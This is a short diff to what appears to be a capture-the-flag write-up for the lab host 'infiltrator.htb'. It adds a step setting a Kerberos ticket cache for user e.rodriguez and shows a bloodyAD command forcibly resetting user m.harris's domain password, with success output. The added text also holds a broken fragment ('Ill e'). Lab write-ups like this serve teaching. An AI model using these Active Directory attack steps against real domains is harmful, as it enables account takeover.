@@ -409,6 +409,12 @@ SMB         dc01.infiltrator.htb 445    DC01             [+] Run the following c
 Ill get a TGT for the `e.rodriguez` user
 
 ```python
+export KRB5CCNAME=e.rodriguez.ccache
+```
+
+Ill e
+
+```python
 bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -k set password 'm.harris' 'Password123!'
 [+] Password changed successfully!
 ```
